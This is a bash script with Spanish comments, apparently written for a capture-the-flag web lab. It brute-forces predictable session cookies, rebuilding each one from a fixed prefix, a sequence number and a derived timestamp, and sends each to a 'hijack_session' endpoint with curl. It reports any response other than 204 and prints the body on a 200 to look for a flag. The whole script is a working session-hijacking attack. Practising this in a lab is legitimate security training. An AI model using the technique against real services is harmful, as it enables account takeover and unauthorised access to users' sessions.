#!/usr/bin/env bash
#
# smart_bruteforce.sh
# Barrido interactivo mostrando solo respuestas ≠ 204
#

URL="http://web0x01.hbtn/api/hijack_session"
PREFIX="d3c0b51f-ec52-44d4-881"
BASE_SEQ=9642740
BASE_TS=17469832402

# Leer rango de usuario
read -p "START_SEQ: " START_SEQ
read -p "END_SEQ:   " END_SEQ

echo "Probando secuencias ${START_SEQ} … ${END_SEQ} (solo muestro HTTP≠204)"

for seq in $(seq "$START_SEQ" "$END_SEQ")
do
    delta=$(( seq - BASE_SEQ ))
    ts=$(( BASE_TS + delta * 2 ))
    cookie="${PREFIX}-${seq}-${ts}"

    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -H "Cookie: hijack_session=${cookie}" \
      -H "Accept: application/json" \
      "${URL}")

    if [ "$code" != "204" ]
    then
        echo "Seq ${seq}: HTTP ${code} — cookie=${cookie}"
        # Si es 200, mostramos el body para buscar flag
        if [ "$code" = "200" ]
        then
            curl -s -L \
              -H "Cookie: hijack_session=${cookie}" \
              -H "Accept: application/json" \
              "${URL}"
            echo
            echo "🚩 ¡Revisa si contiene “flag”!"
            break
        fi
    fi
done

echo "Listo."
